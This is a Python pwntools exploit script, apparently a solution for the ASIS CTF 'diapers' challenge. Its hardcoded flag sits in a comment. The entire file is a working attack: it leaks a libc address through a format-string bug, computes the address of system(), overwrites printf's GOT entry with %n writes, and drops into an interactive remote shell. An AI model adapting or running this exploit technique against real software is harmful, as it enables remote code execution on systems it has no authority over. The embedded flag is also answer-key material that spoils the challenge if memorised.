#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#ASIS{0f79c549a4ecf610a88af47bce3d5476}
#host = "10.211.55.28"
#port = 8888
host ="diapers.asis-ctf.ir"
port = 1343


r = remote(host,port)
def init(choice):
    r.recvuntil(">")
    r.sendline(str(choice))
def change_brand(content):
    r.recvuntil(">")
    r.sendline("0")
    r.recvuntil("to:")
    r.send(content)

def change_diaper():
    r.recvuntil(">")
    r.sendline("1")

def leave(y=None):
    r.recvuntil(">")
    r.sendline("2") 
    if y:
        r.recvuntil("####")
        data = r.recvuntil("****")
        return data

init(3)
change_diaper()
change_brand("aaaabbbbccc\x01")
change_diaper()
change_diaper()
strlen_got = 0x0804b028
payload = "a"*0xf
payload += p32(strlen_got)
payload += "####"
payload += "%18$s"
payload += "****"
payload = payload.ljust(0x6c,"b")
change_brand(payload)
data = leave("a")[:4]
libc = u32(data)-0x7e3b0
print "libc:",hex(libc)
system = libc + 0x3ad80
printf_got = 0x804b00c
payload = "a"*0xf
payload += p32(printf_got)
payload += p32(printf_got+1)
payload += p32(printf_got+2)
payload += p32(printf_got+3)
payload += ";sh;"
prev = 20
for i in range(4):
    payload += fmtchar(prev,(system >> i*8) & 0xff,18+i)
    prev = (system >> i*8) & 0xff
payload = payload.ljust(0x6c,"f")
change_brand(payload)
leave()
r.sendline("2")
r.interactive()
